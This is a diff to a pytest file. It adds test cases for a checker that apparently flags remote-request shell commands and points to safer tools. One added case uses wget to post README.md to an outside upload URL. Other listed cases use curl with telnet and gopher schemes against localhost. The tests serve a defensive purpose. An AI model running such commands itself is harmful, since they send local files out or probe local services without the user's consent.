@@ -240,6 +240,11 @@ REMOTE_REVIEW = (
         pytest.param("curl telnet://localhost:23 < report.txt", id="other schemes on this machine"),
         pytest.param("curl gopher://127.0.0.1:70/_x", id="gopher on this machine"),
         pytest.param("curl -K cfg http://localhost:3000/", id="local requests with options from a file"),
+        pytest.param(
+            "wget -d --post-file=README.md -d https://example.com/upload http://localhost/",
+            id="a wget debug flag beside a post and a remote URL",
+        ),
+        pytest.param("wget --post-data x=1 http://localhost:3000/", id="wget posts to this machine"),
     ],
 )
 def test_remote_requests_ask_and_point_to_safer_tools(capsys: pytest.CaptureFixture[str], command: str) -> None:
